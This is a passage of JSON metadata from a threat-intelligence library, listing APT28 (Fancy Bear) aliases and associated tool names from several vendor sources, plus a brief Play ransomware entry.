            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1446293319,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/2fd37e0616a93fb94131cddecbb40e976de62364.pdf",
        "text": "https://archive.orkl.eu/2fd37e0616a93fb94131cddecbb40e976de62364.txt",
        "img": "https://archive.orkl.eu/2fd37e0616a93fb94131cddecbb40e976de62364.jpg"
    }
}